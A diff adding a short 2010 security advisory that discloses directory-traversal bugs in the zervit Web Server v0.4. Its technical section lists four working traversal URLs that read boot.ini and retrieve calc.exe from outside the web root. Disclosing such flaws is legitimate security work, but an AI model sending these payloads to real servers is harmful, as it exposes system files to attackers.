@@ -1,0 +1,26 @@
+###################################################################
+#
+# zervit Web Server v0.4 Directory Traversals
+# Found By:	Dr_IDE
+# Date: 	May 12, 2010
+# Download:	http://zervit.sourceforge.net/
+# Tested on:	Windows 7
+#
+###################################################################
+
+- Description -
+
+zervit HTTP Server v0.4 is a Windows based HTTP server. This is the latest
+version of the application available.
+
+zervit HTTP Server is vulnerable to remote directory traversal attacks. Other traversal bugs
+have been released for this server but this can be done from a browser, no need for Host headers.
+
+- Technical Details - (This is with Directory Listing = On or Off)
+
+http://[ webserver IP][:port]index.html?../../../../../boot.ini
+http://[ webserver IP][:port]index.html?..\..\..\..\..\boot.ini
+http://[ webserver IP][:port]calc.exe?../../../../windows/system32/calc.exe
+http://[ webserver IP][:port]calc.exe?..\..\..\..\windows\system32\calc.exe
+
+#[pocoftheday.blogspot.com]
